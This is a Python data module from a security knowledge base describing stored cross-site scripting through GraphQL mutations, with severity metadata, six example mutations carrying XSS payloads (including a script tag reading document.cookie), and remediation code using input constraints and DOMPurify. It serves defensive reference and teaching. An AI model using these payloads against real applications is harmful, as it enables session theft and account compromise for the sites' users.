#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: GraphQL Mutation XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via GraphQL Mutations",
    "severity": "high",
    "cvss_score": 7.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "graphql", "mutation", "stored-xss", "api", "crud"],
    "description": """
GraphQL mutations store user data that can contain XSS payloads. When this stored
data is later queried and rendered, stored XSS occurs.

SEVERITY: HIGH
Mutations create persistent/stored XSS. Affects all users who view the data.
Common in user profiles, comments, posts, and any user-generated content.
""",
    "attack_vector": """
STORED XSS VIA MUTATION:
mutation {
  updateProfile(bio: "<script>alert(document.cookie)</script>") {
    id
    bio
  }
}

CREATE WITH XSS:
mutation {
  createPost(title: "Hello", content: "<img src=x onerror=alert(1)>") {
    id
  }
}

NESTED MUTATION:
mutation {
  createUser(input: {
    name: "John"
    profile: {
      bio: "<svg onload=alert(1)>"
    }
  }) { id }
}

FILE UPLOAD MUTATION:
mutation($file: Upload!) {
  uploadAvatar(file: $file) {
    url  // SVG with XSS
  }
}

COMMENT MUTATION:
mutation {
  addComment(postId: 1, text: "<a href=javascript:alert(1)>Click</a>") {
    id
  }
}

UPDATE ARRAY:
mutation {
  updateTags(tags: ["<script>alert(1)</script>", "normal"]) {
    tags
  }
}
""",
    "remediation": """
DEFENSE:

1. SANITIZE input in mutation resolvers
2. Validate all string inputs
3. Use GraphQL input types with validation
4. Sanitize before storing in database
5. Sanitize again before rendering
6. Implement mutation rate limiting

INPUT VALIDATION:
// GraphQL Schema
input ProfileInput {
  bio: String @constraint(maxLength: 500, pattern: "^[^<>]*$")
}

RESOLVER SANITIZATION:
const resolvers = {
  Mutation: {
    updateBio: async (_, { bio }, ctx) => {
      const sanitized = DOMPurify.sanitize(bio, { ALLOWED_TAGS: [] });
      return ctx.db.updateBio(ctx.user.id, sanitized);
    }
  }
};

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- GraphQL Security Cheat Sheet
""",
}
